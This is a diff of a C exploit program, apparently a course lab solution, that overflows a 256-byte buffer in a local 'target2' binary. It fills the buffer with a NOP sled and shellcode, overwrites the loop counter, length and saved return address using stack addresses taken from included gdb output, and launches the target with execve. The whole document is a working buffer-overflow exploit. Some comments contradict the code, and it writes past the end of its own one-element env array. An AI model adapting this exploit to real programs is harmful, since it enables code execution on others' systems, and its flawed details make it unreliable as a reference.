@@ -6,83 +6,70 @@
 
 #define TARGET "../targets/target2"
 
+/*
+(gdb) i f
+Stack level 0, frame at 0x2021fe60:
+ rip = 0x400afa in foo (target2.c:11); saved rip 0x400bbd
+ called by frame at 0x2021fe90
+ source language c.
+ Arglist at 0x2021fe50, args:
+.... 
+Locals at 0x2021fe50, Previous frame's sp is 0x2021fe60
+ Saved registers:
+  rbp at 0x2021fe50, rip at 0x2021fe58
+(gdb) p &buf
+$1 = (char (*)[256]) 0x2021fd40
+(gdb) p &len
+$2 = (int *) 0x2021fe4c
+(gdb) p &i
+$3 = (int *) 0x2021fe48
 
-/*      (gdb) info frame [foo]
-        Stack level 0, frame at 0x2021ff00:
-        rip = 0x400c25 in foo (target2.c:11); saved rip = 0x400dbf
-        called by frame at 0x2021ff30
-        source language c.
-        Arglist at 0x2021fef0, args: arg=0x7fffffffe981 "test"
-        Locals at 0x2021fef0, Previous frame's sp is 0x2021ff00
-        Saved registers:
-        rbp at 0x2021fef0, rip at 0x2021fef8
+Offsets from buf[0] calculated from the difference in the address of the rip/variables from buf
+set buf[268] = len = (0x2021fe58 -0x2021fd40) + 3B = 283  (difference btw address of rip and buf[0] and with extra 3B because the return address is 4B long) 
+set buf[264] = i = 267 (skip copying buf[266])
+set env[1] = &buf + 280 = return value = 0x2021fd40
+set env[0] = NULL
 
-        (gdb) p &buf
-        $1 = (char (*)[256]) 0x2021fde0
-        //decimal: (539098592)
-
-        (gdb) p &len
-        $2 = (int *) 0x2021fee8
-        //decimal: (539098856)
-
-        (gdb) p &i
-        $3 = (int *) 0x2021feec
-        //decimal: (539098860)
-        
-        The environment variables are stored in the top of the stack when the
-        program is started, any modification by setenv() are then allocated
-        elsewhere.  The stack at the beginning then looks like this:
-
-
-              <strings><argv pointers>NULL<envp pointers>NULL<argc><argv><envp>
 */
 
 int
 main ( int argc, char * argv[] )
 {
-	char *	args[3];
-	char *	env[1];
-
-    /*
-	args[0] = TARGET;
-	args[1] = "hi there";
-	args[2] = NULL;
-
-	env[0] = NULL;
-    */
+    char *	args[3];
+    char *	env[1];
     int i;
-    char    buf[284];
+    char    buf[271];
 
-	args[0] = TARGET;
+    args[0] = TARGET;
 
-    // Pad beginning with 18 NOP's ('\x90')
-    // We use 18 because the shellcode is 46 bytes
-    // 18+46 = 64 which will keep the buf byte aligned
-    for (i = 0 ; i < 83; i++)
+    // Instantiate with NOP's ('\x90')
+    for (i = 0 ; i < 271; i++)
         buf[i] = '\x90';
-
+    
     // Copy shellcode into buf
-    for (; i < 128; i++)
-        buf[i] = shellcode[i-83];
-
-    // NOPs between shellcode and 
-    for (; i < 264; i++)
-        buf[i] = '\x90';
-
-    // write '283' to len starting at buf[264]
-    for (; i < 268; i = i+4) {
-        buf[i+3] = '\x90';
-        buf[i+2] = '\x00';
-        buf[i+1] = '\x01';
-        buf[i]   = '\x1b';
-    }
+    //starting with 19 to word align 45B shell code (83+45 = 128)
+    for (i = 19; i < 64; i++)
+        buf[i] = shellcode[i-19];
+    
+      
+    //write 264 to i = 0x010b to skip buf[266]
+    buf[264] = '\x0b';
+    buf[265] = '\x01';
+      
+    // write '283' = 0x011b to len starting at buf[264]
+    buf[268] = '\x1b';
+    buf[269] = '\x01';
+    buf[270] = '\x00';
 
     args[1] = buf;
-	args[2] = NULL;
-    //env[0] = '\x00';
-    env[1] = "\x90\x0c\x01\x90\x90\xe0\xfd\x21\x20";
-
-	if ( execve (TARGET, args, env) < 0 )
+    args[2] = NULL;
+    env[0] = &buf[270];
+    
+    // save buf address 0x2021fd40
+    env[1] = "\x90\x90\x90\x90"
+             "\x90\x90\x90\x90"
+             "\x40\xfd\x21\x20";
+    if ( execve (TARGET, args, env) < 0 )
 		fprintf (stderr, "execve failed.\n");
 
 	return (0);
